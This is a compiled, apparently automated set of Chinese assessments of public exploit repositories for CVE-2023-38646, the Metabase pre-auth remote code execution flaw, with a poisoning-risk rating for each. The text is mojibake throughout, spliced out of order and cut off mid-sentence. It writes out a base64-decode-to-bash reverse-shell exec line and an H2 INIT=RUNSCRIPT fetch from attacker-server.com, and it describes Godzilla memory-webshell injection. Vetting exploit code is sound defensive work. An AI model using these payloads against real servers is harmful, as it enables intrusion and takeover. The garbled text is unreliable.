**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ç‰ˆæœ¬ï¼Œ1.46.6.1ä¹‹å‰Enterpriseç‰ˆæœ¬ï¼Œä»¥åŠå…¶ä»–å—å½±å“çš„å›ºå®šç‰ˆæœ¬ä¹‹å‰çš„ç‰ˆæœ¬

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹å¯ä»æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§å¾ˆé«˜ã€‚

**æœ‰æ•ˆæ€§:**

*   æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æœç´¢å¼•æ“ç»“æœç¡®è®¤äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ï¼Œå¹¶æä¾›äº†å¤šä¸ªå…³äºè¯¥æ¼æ´çš„æè¿°ã€å½±å“å’ŒæŠ€æœ¯ç»†èŠ‚çš„ç½‘é¡µé“¾æ¥ï¼ŒåŒ…æ‹¬PoCä»£ç çš„GitHubé“¾æ¥ã€‚
*   æä¾›çš„PoCä»£ç  (`CVE-2023-38646.py`) çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå®ƒåˆ©ç”¨äº† Metabase çš„ `setup-token` å’Œ H2 æ•°æ®åº“çš„ç‰¹æ€§æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **è·å– Setup Token å’Œ Metabase ç‰ˆæœ¬:** PoC é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæ£€ç´¢ `setup-token` å’Œ Metabase ç‰ˆæœ¬ã€‚
2.  **æ„é€  Payload:**  æ„å»ºåå¼¹ shell çš„ payload, å¹¶å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚
3.  **æ„é€ Exploitæ•°æ®:** PoC æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON æ•°æ®ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªåˆ©ç”¨ `CREATE TRIGGER` çš„ payloadï¼Œè¯¥è§¦å‘å™¨åœ¨ `INFORMATION_SCHEMA.TABLES` ä¸Šæ‰§è¡Œ `SELECT` æ“ä½œä¹‹å‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`token` å­—æ®µæ‹¼æ¥äº† setup token å’Œ base64 ç¼–ç åçš„ payloadã€‚
4.  **å‘é€æ¶æ„è¯·æ±‚:** PoC å‘ `/api/setup/validate` å‘é€å¸¦æœ‰æ„é€ çš„ JSON æ•°æ®çš„ POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚ä¼šè§¦å‘ H2 æ•°æ®åº“è¿æ¥å’Œè§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©:**

PoCä»£ç æœ¬èº«çš„åå¼¹shellè¿æ¥åœ°å€æ˜¯å¯ä»¥é…ç½®çš„, å¦‚æœä½œè€…æƒ³æŠ•æ¯’,å¯ä»¥å°†IPåœ°å€å†™æ­»,æˆ–è€…åŠ å…¥å…¶ä»–æ¶æ„æ“ä½œ.
*   æ¼æ´åˆ©ç”¨ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…¶ç›®çš„æ˜¯æ˜ç¡®çš„ã€‚
*   `README.md` æ–‡ä»¶åªåŒ…å« PoC çš„åŸºæœ¬ä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½, å¤§æ¦‚åœ¨10%å·¦å³ã€‚æŠ•æ¯’çš„ä¸»è¦é£é™©åœ¨äºæ¶æ„ä¿®æ”¹payloadï¼Œä¾‹å¦‚åå¼¹shellåœ°å€æˆ–è€…æ’å…¥å…¶ä»–çš„æ¶æ„æ“ä½œã€‚

**é¡¹ç›®åœ°å€:** [Zenmovie/CVE-2023-38646](https://github.com/Zenmovie/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #16

**æ¥æº**: [CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md](../2023/CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md)

# CVE-2023-38646

> ğŸ“¦ è¯¥CVEæœ‰ **27** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md](../2023/CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md)

## CVE-2023-38646 - Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯å…¬å¼€è®¿é—®æˆ–æ”»å‡»è€…ä½äºåŒä¸€ç½‘ç»œ

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ã€‚æ¼æ´å­˜åœ¨äº Metabase 0.46.6.1 ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ 1.46.6.1 ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æ ¹æ®æœç´¢ç»“æœï¼Œå·²ç»æœ‰å…¬å¼€çš„ PoC ä»£ç å¯ç”¨ (ä¾‹å¦‚ï¼Œgithub.com/threatHNTR/CVE-2023-38646)ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åŸºäº Assetnote çš„ä¸€ç¯‡å…³äºè¯¥æ¼æ´åˆ†æçš„æ–‡ç« ã€‚å®ƒé€šè¿‡åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥é…ç½®ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥ URLï¼Œåœ¨è¿æ¥æ•°æ®åº“æ—¶è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1.  **æ„é€ æ¶æ„ JSON Payload:**  è¯¥ JSON payload ç”¨äºåˆ›å»ºæˆ–ä¿®æ”¹ Metabase ä¸­çš„æ•°æ®åº“è¿æ¥ã€‚ å…¶ä¸­ `classname` è¢«è®¾ç½®ä¸º `org.h2.Driver` , `subname` åŒ…å«æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²,å­—ç¬¦ä¸²åˆ©ç”¨ H2 çš„ `CREATE TRIGGER` ç‰¹æ€§ï¼Œåœ¨INFORMATION_SCHEMA.TABLESä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, è¯¥è§¦å‘å™¨ä¼šåœ¨æ¯æ¬¡æŸ¥è¯¢è¯¥è¡¨æ—¶æ‰§è¡ŒåµŒå…¥çš„ JavaScript ä»£ç , JavaScriptä»£ç è´Ÿè´£æ‰§è¡Œå‘½ä»¤.
2.  **å‘é€Payload:** é€šè¿‡å‘é€ POST è¯·æ±‚åˆ° Metabase API ç«¯ç‚¹ï¼ˆé€šå¸¸æ˜¯ /api/setup/validate æˆ–å…¶ä»–ç›¸å…³ç«¯ç‚¹ï¼‰ï¼Œå°†æ„é€ çš„ JSON payload å‘é€ç»™ Metabase æœåŠ¡å™¨ã€‚ç”±äºè¯¥æ¼æ´æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå› æ­¤æ— éœ€æä¾›ä»»ä½•èº«ä»½éªŒè¯ä¿¡æ¯ã€‚
3.  **è§¦å‘ RCE:** Metabase æœåŠ¡å™¨å°è¯•ä½¿ç”¨æä¾›çš„é…ç½®è¿æ¥åˆ° H2 æ•°æ®åº“æ—¶ï¼Œæ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ä¼šè¢«è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ PoC çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ã€‚ åˆ†æä»£ç ï¼Œå‘ç°é«˜é£é™©çš„è¡Œä¸ºæ˜¯æ‰§è¡Œ `java.lang.Runtime.getRuntime().exec('bash -c {echo,BASE64COMMAND}|{base64,-d}|{bash,-i}')`ã€‚è¿™è¡Œä»£ç å…è®¸æ‰§è¡Œä»»æ„çš„ bash å‘½ä»¤ã€‚æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **å‘½ä»¤æ³¨å…¥é£é™©ï¼š**  è™½ç„¶ä»£ç ä¸­ä½¿ç”¨äº† Base64 ç¼–ç ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯èƒ½é€šè¿‡ä¿®æ”¹ Base64 ç¼–ç çš„å†…å®¹æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚
*   **æƒé™æå‡é£é™©ï¼š**  ç”±äºä»£ç ä»¥ Metabase æœåŠ¡å™¨çš„æƒé™è¿è¡Œï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æå‡æƒé™ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ä¸»è¦æ¥è‡ªäºå‘½ä»¤æ³¨å…¥çš„å¯èƒ½æ€§ï¼Œä½†è¿™å–å†³äºå¦‚ä½•ä½¿ç”¨å’Œä¿®æ”¹ PoCã€‚æ•´ä½“æŠ•æ¯’å¯èƒ½æ€§è¾ƒä½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦1%ã€‚å› ä¸ºä½œè€…å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªæ¼æ´çš„æ‰©å±•ï¼Œæ„åœ¨è§£å†³ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„åˆ©ç”¨é—®é¢˜ï¼Œå¹¶ä¸”ä¸»è¦ä»£ç é€»è¾‘æ˜¯åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„ã€éšè”½çš„æ¶æ„ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [0utl4nder/Another-Metabase-RCE-CVE-2023-38646](https://github.com/0utl4nder/Another-Metabase-RCE-CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #2

**æ¥æº**: [CVE-2023-38646-AnvithLobo_CVE-2023-38646.md](../2023/CVE-2023-38646-AnvithLobo_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯é€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œé¢„å…ˆè®¾å®šçš„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **è·å–Tokenï¼š** é¦–å…ˆï¼Œé€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å–ä¸€ä¸ªsetup tokenã€‚
2.  **æ„é€ Payloadï¼š**  ç„¶åï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åˆ©ç”¨`CREATE TRIGGER`è¯­å¥åˆ›å»ºè§¦å‘å™¨ï¼Œåœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œå‰è§¦å‘ã€‚è§¦å‘å™¨æ‰§è¡Œçš„JavaScriptä»£ç ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
3.  **Base64ç¼–ç ï¼š** ä½¿ç”¨Base64å¯¹åå‘shellæŒ‡ä»¤è¿›è¡Œç¼–ç ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦å½±å“ã€‚
4.  **å‘é€Payloadï¼š**  æœ€åï¼Œå°†æ„é€ å¥½çš„JSON payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚

**æœ‰æ•ˆæ€§ï¼š**  æä¾›çš„PoCä»£ç æœ‰æ•ˆï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©ï¼š**  ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å¹¶æ‰§è¡Œåå‘shellã€‚ä½œè€…æä¾›çš„ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ¶æ„ä»£ç ç‰‡æ®µæˆ–è€…éšè—çš„åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½ä¸æè¿°ä¸€è‡´ï¼Œç›®çš„æ˜¯åˆ©ç”¨Metabaseçš„æ¼æ´æ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚å› æ­¤, æŠ•æ¯’é£é™©è¯„ä¼°ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [AnvithLobo/CVE-2023-38646](https://github.com/AnvithLobo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #3

**æ¥æº**: [CVE-2023-38646-Boogipop_MetabaseRceTools.md](../2023/CVE-2023-38646-Boogipop_MetabaseRceTools.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1, Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼åˆ†æå¦‚ä¸‹ï¼š

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æœªæˆæƒè®¿é—®ï¼š** è¯¥æ¼æ´æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ã€‚
2.  **RCEï¼š**  æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„è¯·æ±‚ï¼Œæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„ä»»æ„å‘½ä»¤ã€‚
3.  **å…·ä½“åˆ©ç”¨ï¼š** æ ¹æ®æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ”»å‡»æµç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š
    *   **éªŒè¯æ¨¡å—ï¼š**  å‘`/api/session/properties`ç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œè·å–æœªæˆæƒçš„tokenï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚
    *   **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** åˆ©ç”¨ä¸Šä¸€æ­¥è·å–çš„tokenï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚éœ€è¦æŒ‡å®šmetabase.jarçš„ä½ç½®ã€‚
    *   **å†…å­˜é©¬æ³¨å…¥æ¨¡å—ï¼š** é€šè¿‡ä¿®æ”¹`x-client-data`è¯·æ±‚å¤´æ³¨å…¥å†…å­˜é©¬ï¼Œæ”¯æŒ cmd å’Œ godzilla ä¸¤ç§æ¨¡å¼ã€‚cmdæ¨¡å¼ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œgodzillaæ¨¡å¼åˆ™ç›´æ¥è¿æ¥å“¥æ–¯æ‹‰webshellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ª Metabase RCE å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†éªŒè¯æ¨¡å—ã€å‘½ä»¤æ‰§è¡Œæ¨¡å—å’Œå†…å­˜é©¬æ³¨å…¥æ¨¡å—ã€‚ä¸»è¦çš„æ½œåœ¨æŠ•æ¯’é£é™©å­˜åœ¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **å†…å­˜é©¬æ³¨å…¥ï¼š** å†…å­˜é©¬æ³¨å…¥æ¨¡å—æœ¬èº«å…·æœ‰è¾ƒé«˜çš„é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºæ¤å…¥æ¶æ„ä»£ç ï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨ã€‚ä»£ç ä¸­`x-client-data:godzilla`çš„æ–¹å¼è¿æ¥å“¥æ–¯æ‹‰webshellï¼Œé»˜è®¤å¯†ç ä¸ºpassï¼Œå¯èƒ½ä¼šè¢«å…¶ä»–äººåˆ©ç”¨ã€‚
2.  **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** è™½ç„¶å‘½ä»¤æ‰§è¡Œæ¨¡å—çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹è¯¥æ¨¡å—ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚

è€ƒè™‘åˆ°ä»¥ä¸Šé£é™©ï¼Œè¯¥POCå·¥å…·å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå°¤å…¶æ˜¯å†…å­˜é©¬æ¨¡å—ã€‚éœ€è¦åœ¨ä½¿ç”¨å‰è¿›è¡Œä»£ç å®¡è®¡ï¼Œç¡®ä¿æ²¡æœ‰æ¶æ„ä»£ç ã€‚

**é£é™©è¯„ä¼°ï¼š**

å°½ç®¡è¯¥å·¥å…·ç®€åŒ–äº†æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä½¿ç”¨å®ƒä¹Ÿå¯èƒ½å¼•å…¥é£é™©ã€‚ç”¨æˆ·åº”è°¨æ…ä½¿ç”¨æ­¤å·¥å…·ï¼Œå¹¶å……åˆ†äº†è§£å…¶æ½œåœ¨çš„å±å®³ã€‚å»ºè®®åœ¨éç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œå……åˆ†çš„å®‰å…¨æµ‹è¯•ã€‚

**é£é™©æ¦‚ç‡ï¼š**

è€ƒè™‘åˆ°å†…å­˜é©¬æ³¨å…¥çš„é£é™©ï¼Œä¸”è¯¥POCå·¥å…·ç”±ä¸ªäººå¼€å‘è€…æä¾›ï¼Œå¹¶éæ¥è‡ªå®˜æ–¹æˆ–ä¿¡èª‰è‰¯å¥½çš„å®‰å…¨å‚å•†ï¼Œå› æ­¤ç»¼åˆè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªäºå¯¹ä½¿ç”¨è€…ç¼ºä¹å®‰å…¨æ„è¯†ä»¥åŠå¯¹å·¥å…·çš„æœªçŸ¥æ€§å¯èƒ½å¸¦æ¥çš„é£é™©ï¼Œè€Œéä»£ç æœ¬èº«ä¸€å®šå­˜åœ¨æ¶æ„åé—¨ã€‚

**é¡¹ç›®åœ°å€:** [Boogipop/MetabaseRceTools](https://github.com/Boogipop/MetabaseRceTools)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #4

**æ¥æº**: [CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md](../2023/CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ä»¥é€šè¿‡HTTPè®¿é—®ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´åˆ©ç”¨äº† Metabase å¤„ç†æ•°æ®åº“è¿æ¥çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ H2 æ•°æ®åº“ã€‚æä¾›çš„ POC è„šæœ¬é¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œæœ€åæ·»åŠ ä¸€ä¸ªæ¶æ„çš„æ•°æ®åº“è¿æ¥ï¼Œè¯¥è¿æ¥åŒ…å«ä¸€ä¸ª H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥å¼å‘½ä»¤ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚è¿æ¥å­—ç¬¦ä¸²ä¸­çš„ `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` æŒ‡ç¤º H2 ä»è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œ SQL è„šæœ¬ï¼Œè™½ç„¶ `poc.sql` æ–‡ä»¶æœ¬èº«æ— å®³ï¼Œä½†çœŸæ­£çš„æ”»å‡»è½½è·åµŒå…¥åœ¨è¿æ¥å­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºä¸€ä¸ªJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**åˆ©ç”¨æ–¹å¼ï¼š**\n1. **è·å– Setup Token:**  é€šè¿‡è®¿é—® `/api/session/properties` è·å–åˆå§‹è®¾ç½®æ‰€éœ€çš„ tokenã€‚\n2. **è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·:**  ä½¿ç”¨è·å–çš„ tokenï¼Œè°ƒç”¨ `/api/setup` åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰å¿…è¦æƒé™çš„ä¼šè¯ã€‚\n3. **æ·»åŠ æ¶æ„æ•°æ®åº“è¿æ¥:** ä½¿ç”¨æ–°åˆ›å»ºçš„ç®¡ç†å‘˜ä¼šè¯ï¼Œè°ƒç”¨ `/api/database` API æ·»åŠ ä¸€ä¸ªæ–°çš„æ•°æ®åº“ã€‚å…³é”®åœ¨äºæ„é€ æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ `INIT` å‚æ•°æ‰§è¡Œè¿œç¨‹ SQL è„šæœ¬ï¼Œè¯¥è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª Java å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸ºäº†ç»•è¿‡æŸäº›é™åˆ¶ï¼Œé€šå¸¸åˆ©ç”¨ 